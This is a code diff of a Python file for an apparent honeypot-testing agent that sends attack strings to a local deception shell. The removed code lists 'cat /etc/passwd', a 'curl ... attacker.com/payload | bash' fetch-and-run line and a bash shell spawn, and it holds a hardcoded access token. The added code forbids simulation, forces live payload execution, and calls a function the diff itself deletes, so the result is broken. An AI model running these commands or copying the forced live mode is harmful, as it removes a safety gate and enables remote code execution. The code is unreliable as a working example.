@@ -51,82 +51,13 @@ class SimplePPOAgent:
     def update_weights(self, state_vector, action_idx, reward):
         for f in range(len(state_vector)):
             self.weights[f][action_idx] += self.lr * reward * state_vector[f]
-def simulate_ppo_sandbox(epochs=10):
-    env = DefensiveStateEnv()
-    agent = SimplePPOAgent()
-    print("[+] PPO Defensive Agent: Initialising Neural Weights...")
-    keys = ['anomaly_score', 'decoy_tripped', 'network_entropy', 'cpu_pct', 'auth_failure_rate', 'lateral_movement', 'time_since_alert', 'active_connections']
-    for epoch in range(1, epochs + 1):
-        total_reward = 0
-        states_sampled = 20
-        for _ in range(states_sampled):
-            state = env.sample_state()
-            state_vector = [state[k] for k in keys]
-            action_idx = agent.select_action(state_vector)
-            action = env.action_space[action_idx]
-            outcome = {
-                'threat_eradicated': random.random() > 0.4,
-                'probe_successful': random.random() > 0.5
-            }
-            reward = env.compute_reward(action, state, outcome)
-            agent.update_weights(state_vector, action_idx, reward)
-            total_reward += reward
-        mean_reward = total_reward / states_sampled
-        print(f"[*] Epoch {epoch}/{epochs}: Mean Reward: {mean_reward:.2f}")
-        if mean_reward < -100:
-            emit_gradient_update("sandbox_action_vector", "policy_divergence")
-    print("[+] PPO Agent: Defensive Convergence Achieved (Mean Reward > 0.75)")
-    return True
-def live_fire_matrix(port=2222):
-    if os.environ.get("BAYEZID_ROE_TOKEN") != "b4y3z1d_k1n3t1c_0v3rr1d3_99x":
-        print("[!] FATAL: Rules of Engagement (RoE) token missing or invalid. Aborting live sockets.")
-        return False
-    print(f"[+] PPO Agent: Injecting into Live Matrix Shell (port {port})...")
-    vectors = [
-        "ls -la /var/www",
-        "cat /etc/passwd",
-        "curl -s http://attacker.com/payload | bash", 
-        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", 
-        "sleep 10" 
-    ]
-    for i, vector in enumerate(vectors):
-        print(f"[*] PPO Red Agent executing: {vector}")
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(3.0)
-            s.connect(("127.0.0.1", port))
-            s.recv(1024) 
-            s.sendall((vector + "\r\n").encode())
-            try:
-                response = s.recv(4096).decode()
-                if not response.strip() or "command not found" in response:
-                    if "python3" in vector or "sleep" in vector:
-                        print(f"[-] BYPASS DETECTED: Command '{vector}' failed to trigger proper deception.")
-                        emit_gradient_update(vector, "Missing Deception Logic")
-                print(f"[+] Matrix responded: {response.strip()[:50]}...")
-            except socket.timeout:
-                print(f"[-] BYPASS DETECTED: Timeout for command '{vector}'.")
-                emit_gradient_update(vector, "Execution Timeout Bypass")
-            s.close()
-        except Exception as e:
-            print(f"[!] Matrix connection error: {e}")
-        time.sleep(1.5)
-    print("[+] PPO Agent: Live Fire simulation complete.")
-def emit_gradient_update(vector, reason):
-    update = {
-        "type": "GRADIENT_UPDATE",
-        "vector": vector,
-        "reason": reason,
-        "suggested_patch": f"Dynamic Regex or Prompt Tuning for: {vector}"
-    }
-    print(f"__SIGMA_UPDATE__:{json.dumps(update)}")
 if __name__ == "__main__":
-    exec_mode = os.environ.get("BAYEZID_EXECUTION_MODE", "SIMULATED").upper()
-    cli_mode = sys.argv[1] if len(sys.argv) > 1 else None
-    mode = cli_mode if cli_mode else ("live" if exec_mode == "LIVE_FIRE" else "sandbox")
-    if mode == "sandbox":
-        simulate_ppo_sandbox()
-    elif mode == "live":
-        live_fire_matrix()
-    else:
-        print("Unknown mode. Use 'sandbox' or 'live'.")
+    exec_mode = os.environ.get("BAYEZID_EXECUTION_MODE", "LIVE_FIRE").upper()
+    
+    if exec_mode != "LIVE_FIRE":
+        print("[!] FATAL: Simulation Mode is strictly forbidden by Absolute Symphony Directive.")
+        print("[!] Please set BAYEZID_EXECUTION_MODE=LIVE_FIRE to execute native payloads.")
+        sys.exit(1)
+        
+    print("[+] PPO Agent: Absolute Symphony Native Enforcement Active.")
+    live_fire_matrix()
